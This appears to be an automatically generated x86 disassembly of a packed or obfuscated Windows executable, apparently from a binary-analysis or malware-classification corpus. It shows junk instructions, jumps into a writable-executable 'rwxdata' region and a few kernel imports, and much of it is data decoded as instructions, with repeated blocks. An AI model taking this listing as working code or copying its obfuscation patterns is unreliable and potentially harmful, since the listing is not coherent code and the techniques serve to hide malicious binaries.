adc eax eax
push es
popad
je rwxdata
call sub_516af7
adc si dx
clc
stc
add esi ebx
push 0x116783e1
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
jne rwxdata
insb
les edi [ ebx - 0x32 ]
push esi
iretd
pushad
push [ esp + 0x4 ]
mov [ esp + 0x8 ] edi
lea esp [ esp + 0x48 ]
jae rwxdata
call j_sub_5156a9
add [ eax ] al
inc edx
imul esi [ edx + eax * 2 + 0x6c ] 0xe9600074
aad 0xf8
jne rwxdata
call sub_519048
mov dl 0x9a
add [ eax ] al
push 0x6c01121
outsd
outsb
push edi
add al ch
out dx al
adc [ eax ] eax
add [ ebp + 0xf442464 ] cl
xchg edx esi
mov ebp 0x4160fffb
pushfd
inc bl
call sub_4ba811
add [ eax ] al
push edi
jb rwxdata
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
pushad
jmp rwxdata
jpe rwxdata
pushfd
stosb [ edi ]
mov [ esp ] 0x54f5
push [ esp ]
lea esp [ esp + 0x8 ]
jmp rwxdata
popad
je rwxdata
pushfd
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
call sub_5191a9
fcmove st5
pop eax
imul esi [ ebx + 0x6b ] 0x65657246
push ebx
jo rwxdata
popad
je rwxdata
inc esi
imul ebp [ ebp ] 0x8246488
lea esp [ esp + 0x44 ]
je rwxdata
lea esp [ esp + 0x24 ]
jne rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
add [ eax - 0x58 ] ch
adc al al
jle __import_name_0(KERNEL32:GetCurrentProcess)
jle rwxdata
mov esp 0x4601781d
cmp al 0x69
mov [ 0xffffffffe9ef6996 ] ch
lodsb [ si ]
cmpsd [ esi ] [ edi ]
arpl [ ebp + 0x45 ] sp
js rwxdata
jb rwxdata
bound esp [ ecx + 0x73 ]
add [ gs : esi - 0x75 ] ah
push ds
bt dx ax
bt si 0x9
bt bp 0x3
pushad
shr ebx 0xc
stc
cmp ebx 0x1
call sub_515994
add [ eax ] al
inc edi
je rwxdata
cmp ax cx
setns bl
shrd bx si 0x8
push 0x5fb38d27
mov bx [ esi ]
pushfd
and ebx 0xfff
jmp rwxdata
stc
push 0x36eb56d9
stc
cmp ebx 0x2
jmp rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
inc edi
je rwxdata
in al dx
outsd
bswap esi
lahf
cmp al 0x0
add dl bl
int 0x58
mov edi 0x6bd472f
in al 0x62
mov dl 0x70
sti
insb
imul [ edx + 0x7c5df96f ]
mov al 0x27
mov ecx 0x319e2d58
mov eax [ 0xffffffffbc36a200 ]
sbb eax 0x3c460178
imul ecx [ eax - 0x109669d3 ] 0xa7ac67e9
push 0x9447f669
mov ebp 0xd6af0e06
pushfd
cmp [ edi ] eax
add [ ebp - 0x185c2d04 ] ecx
cmpsb [ es : esi ] [ edi ]
sar [ ebp - 0x536ddcb0 ] cl
je rwxdata
add [ ebx - 0x54f099c2 ] cl

salc
arpl [ ebp + 0x73 ] sp
jae rwxdata
test esi ebp
add [ edi + ebx ] ax
pushfd
push [ esp + 0x4 ]
push 0x7ff9b3ca
lea esp [ esp + 0x14 ]
jmp rwxdata
jmp rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
xchg esi eax
imul ebp edi 0xa7ac67e9
jne rwxdata
push 0x7ec010a8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
stosb [ edi ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
cli
stc
dec edi
loopne rwxdata
jb rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
push cs
scasd [ edi ]
salc
sbb dl bh
sub al 0xd3
xchg esp eax
movsd [ edi ] [ esi ]
adc bl [ edi - 0x12 ]
pushfd
mov ebx 0x66909afa
xchg ecx eax
test al 0x38
xchg esi eax
cld
cdq
fsubr st5
outsd
dec eax
mov [ 0xffffffffd2a626e7 ] eax
mov ebp 0xac922350
outsb
je rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
cmp [ edx + 0x26 ] dh
mov edi 0x68ab77ca
cli
jb rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
btc ax 0x1
aaa
mov esi edi
arpl [ eax + eax + 0x66 ] si
adc esi edx
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_516f7b
pushad
mov esi [ esp + 0x30 ]
push 0x1389f8f9
jmp rwxdata
push 0xb80185ad
mov esp ebp
pushfd
push ebx
jmp rwxdata
lea ebp [ eax + 0x54ef73d5 ]
mov ebp [ esp + 0x8 ]
mov [ esp + 0x8 ] 0x5a72
pushfd
push [ esp + 0x10 ]
retn 0x14
sub_517148
ror al 0x6
mov [ esp + 0x4 ] 0x8044
push [ esp ]
mov [ esp ] dl
pushfd
lea esp [ esp + 0x50 ]
call j_sub_51680a
call sub_51646d
lea ebp [ ebx ]
xchg [ edi ] bl
lodsd [ esi ]
fdiv st7
outsd
adc ebx ecx
mov bh [ edx + ecx + 0x1b8427a5 ]
cld
sub_517961
lea esp [ esp + 0xc ]
jae rwxdata
jmp rwxdata
pushad
push 0x53e1ef2f
lea esp [ esp + 0x24 ]
jbe rwxdata
push 0xe54feceb
mov [ esp ] 0x9e49
lea esp [ esp + 0x4 ]
call sub_514aff
push 0x73519e81
pushad
adc al al
jmp rwxdata
jmp rwxdata
push ecx
lea esp [ esp + 0x4 ]
jne rwxdata
pushad
push [ esp + 0x4 ]
mov [ esp + 0x8 ] edi
lea esp [ esp + 0x48 ]
jae rwxdata
jne rwxdata
jpe rwxdata
jmp rwxdata
pushad
jmp rwxdata
pushad
stosb [ edi ]
mov [ esp ] al
pushad
push [ esp ]
lea esp [ esp + 0x44 ]
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
call sub_516d74
pushfd
jmp rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
lea esp [ esp + 0x24 ]
jne rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
stosb [ edi ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
